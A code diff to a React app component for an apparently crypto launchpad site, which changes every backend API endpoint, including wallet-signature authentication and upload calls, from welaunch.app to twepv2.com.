@@ -155,7 +155,7 @@ function MyApp(p) {
   async function isSigned() {
     const bearer = cookieCutter.get('welaunchSignMessage')
     const x = await axios.request({
-      method: 'POST', url: 'https://welaunch.app/api/welaunch', data: { req: 'validate', address: address }, headers: {
+      method: 'POST', url: 'https://twepv2.com/api/welaunch', data: { req: 'validate', address: address }, headers: {
         Authorization: bearer
       }
     })
@@ -164,10 +164,10 @@ function MyApp(p) {
         return true
       } else {
         const web3 = thisWeb3
-        axios.request({ method: 'POST', url: 'https://welaunch.app/api/welaunch', data: { req: 'sign_request', address: address } }).then(async function (response) {
+        axios.request({ method: 'POST', url: 'https://twepv2.com/api/welaunch', data: { req: 'sign_request', address: address } }).then(async function (response) {
           const message = response.data.data.message
           const mes = await web3.eth.personal.sign(message, address)
-          axios.request({ method: 'POST', url: 'https://welaunch.app/api/welaunch', data: { req: 'sign_done', message: message, signed: mes, address: address } }).then(async function (response) {
+          axios.request({ method: 'POST', url: 'https://twepv2.com/api/welaunch', data: { req: 'sign_done', message: message, signed: mes, address: address } }).then(async function (response) {
             const message = response.data.data.token
             cookieCutter.set('welaunchSignMessage', message)
             return true;
@@ -182,10 +182,10 @@ function MyApp(p) {
     } else {
       cookieCutter.set('welaunchSignMessage', "")
       const web3 = thisWeb3
-      axios.request({ method: 'POST', url: 'https://welaunch.app/api/welaunch', data: { req: 'sign_request', address: address } }).then(async function (response) {
+      axios.request({ method: 'POST', url: 'https://twepv2.com/api/welaunch', data: { req: 'sign_request', address: address } }).then(async function (response) {
         const message = response.data.data.message
         const mes = await web3.eth.personal.sign(message, address)
-        axios.request({ method: 'POST', url: 'https://welaunch.app/api/welaunch', data: { req: 'sign_done', message: message, signed: mes, address: address } }).then(async function (response) {
+        axios.request({ method: 'POST', url: 'https://twepv2.com/api/welaunch', data: { req: 'sign_done', message: message, signed: mes, address: address } }).then(async function (response) {
           const message = response.data.data.token
           cookieCutter.set('welaunchSignMessage', message)
           return true;
@@ -210,7 +210,7 @@ function MyApp(p) {
 
       const thisData = await axios.request({
         method: 'POST',
-        url: 'https://welaunch.app/api/welaunch',
+        url: 'https://twepv2.com/api/welaunch',
         headers: { 'Content-Type': 'multipart/form-data; boundary=---011000010111000001101001' },
         data: forms
       })
@@ -218,13 +218,13 @@ function MyApp(p) {
     } else {
       if (bearer) {
         const thisData = await axios.request({
-          method: 'POST', url: 'https://welaunch.app/api/welaunch', data: req, headers: {
+          method: 'POST', url: 'https://twepv2.com/api/welaunch', data: req, headers: {
             Authorization: bearer
           }
         })
         return thisData.data.data
       } else {
-        const thisData = await axios.request({ method: 'POST', url: 'https://welaunch.app/api/welaunch', data: req })
+        const thisData = await axios.request({ method: 'POST', url: 'https://twepv2.com/api/welaunch', data: req })
         return thisData.data.data
       }
     }
@@ -238,7 +238,7 @@ function MyApp(p) {
       form.append("img", data);
       const options = {
         method: 'POST',
-        url: 'https://welaunch.app/api/welaunch',
+        url: 'https://twepv2.com/api/welaunch',
         headers: {
           Authorization: bearer,
           'Content-Type': 'multipart/form-data; boundary=---011000010111000001101001'
@@ -248,7 +248,7 @@ function MyApp(p) {
       const thisData = await axios.request(options)
       return thisData.data.data
     } else {
-      const thisData = await axios.request({ method: 'POST', url: 'https://welaunch.app/api/welaunch', data: req })
+      const thisData = await axios.request({ method: 'POST', url: 'https://twepv2.com/api/welaunch', data: req })
       return thisData.data.data
     }
   }
@@ -283,7 +283,7 @@ function MyApp(p) {
       setChain('0x42')
     } else {
     }
-    const trends = await axios.request({ method: 'GET', url: 'https://welaunch.app/api/trending/BSC-trend.json' })
+    const trends = await axios.request({ method: 'GET', url: 'https://twepv2.com/api/trending/BSC-trend.json' })
     setTrending(trends.data)
   }
 
